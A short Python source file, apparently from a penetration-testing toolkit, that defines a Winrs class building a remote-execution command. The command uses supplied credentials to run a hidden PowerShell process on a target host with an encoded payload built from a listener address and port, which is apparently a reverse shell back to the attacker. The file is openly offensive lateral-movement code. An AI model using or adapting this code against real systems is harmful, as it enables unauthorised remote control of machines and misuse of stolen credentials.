#!/usr/bin/python3
from textwrap import dedent
from shells import Shells
from connection import Connection

class Winrs(Connection):
    @staticmethod
    def get_ps(username: str, password: str, target_ip: str,
            listen_address: str, listen_port: str) -> str:
        """
        Build and return a winrs command string.

        Example returned string:
        winrs -r:files04 -u:steve -p:password123! "cmd /c hostname & whoami"
        """

        encoded = Shells.encode_ps_for_e(listen_address, listen_port)
        command_line = "powershell -nop -w hidden -e " + encoded

        # Wrap the inner command in double quotes so shell grouping is preserved
        # No further escaping is done here — if inner_cmd contains double quotes, caller should escape them.
        return f'winrs -r:{target_ip} -u:{username} -p:{password} "{command_line}"'